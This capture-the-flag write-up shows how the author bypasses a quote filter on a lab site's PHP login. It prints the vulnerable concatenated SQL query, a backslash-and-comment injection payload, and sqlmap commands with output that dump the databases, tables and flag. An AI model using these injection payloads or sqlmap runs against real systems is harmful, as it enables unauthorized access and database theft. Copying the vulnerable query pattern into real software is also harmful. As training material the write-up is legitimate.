# WRITEUP

See this. It filter quote.

```php
if (preg_match("/'/", $_POST['username']) || preg_match("/'/", $_POST['password']))
    die("Hack detected 😵😵😵");

$sql = "select username from users where username='" .$_POST['username'] ."' and password='" .$_POST['password'] ."'";
$sth = $conn->query($sql);
```

<br>
So then, <a href="https://minhtuanact.github.io/post/su-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf/">how can SQL injection bypass quote?</a><br>

Then answer is replace `'` > `\` and `space` > `/**/`.




```sql
select username from users where username='\' and password='OR/**/1=1#'

it same with

select username from users where username=''' and password='OR/**/1=1#'
```
OK, this payload bypass authentication but cannot dump database. 


<br>
Use SQLMap to exploit.

`-u`        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: Target URL <br>
`--data`    &nbsp;&nbsp;&nbsp;: Data string to be sent through POST <br>
`-p`        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: Testable parameter(s) <br>
`--string`  : String to match when query is evaluated to True <br>
`--suffix`  : Injection payload suffix string <br>
`--tamper=space2comment.py`:    Use script replaces space character `(' ')` with comments `'/**/'` for tampering injection data

You can use this for list all tamper
```
# sqlmap --list-tampers
```


<br>
#### Final Payload


```
# sqlmap -u http://shop.kid.cyberjutsu-lab.tech/login.php --data "username=\&password=" -p password --string="Doraemon" --suffix="#" --tamper=space2comment.py --dbs
...
available databases [2]:
[*] information_schema
[*] myDB
...
# sqlmap -u http://shop.kid.cyberjutsu-lab.tech/login.php --data "username=\&password=" -p password --string="Doraemon" --suffix="#" --tamper=space2comment.py -D myDB --tables
...
[7 tables]
+---------------+
| authors       |
| flag_304ad593 |
| posts         |
| roles         |
| user_post     |
| user_role     |
| users         |
+---------------+
...
# sqlmap -u http://shop.kid.cyberjutsu-lab.tech/login.php --data "username=\&password=" -p password --string="Doraemon" --suffix="#" --tamper=space2comment.py -D myDB -T flag_304ad593 --dump
...
[1 entry]
+-------------------------------------+
| flag_3e53dc                         |
+-------------------------------------+
| CTF{pleAs3_doNt_r3invent_th3_whe3L} |
+-------------------------------------+
...

> CTF{pleAs3_doNt_r3invent_th3_whe3L}


```
